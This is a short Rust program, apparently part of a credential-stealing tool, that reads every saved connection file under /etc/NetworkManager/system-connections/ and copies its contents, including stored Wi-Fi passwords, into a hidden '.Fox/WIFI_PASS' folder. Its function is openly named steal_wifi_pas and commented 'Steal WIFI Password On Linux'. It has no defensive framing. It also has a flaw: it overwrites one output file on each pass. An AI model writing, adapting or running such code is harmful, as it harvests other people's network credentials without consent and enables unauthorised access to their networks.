use std::fs;
use std::fs::File;
use std::io::prelude::*;

fn main() {
    let paths = fs::read_dir("/etc/NetworkManager/system-connections/").unwrap();
    let mut file_number: u8 = 0;
    fs::create_dir_all(".Fox").expect("Error! File exist.\n");
    fs::create_dir_all(".Fox/WIFI_PASS").expect("Error! File exist.\n");
    for index in paths {
        file_number += 1;
        //println!("{}", index.unwrap().path().display().to_string());
        //steal_wifi_pas(index.unwrap().path().display().to_string());
        fs::write(".Fox/WIFI_PASS/WIFI-.txt", steal_wifi_pas(index.unwrap().path().display().to_string())).expect("Unable to write file");
    }
}

//Steal WIFI Password On Linux
fn steal_wifi_pas(source: String) -> String {
    let mut files = File::open(&source).expect("Error! No file.\n");
    let mut context: String = String::new();
    files.read_to_string(&mut context).expect("Error! Not readable.\n");
    return context;
}
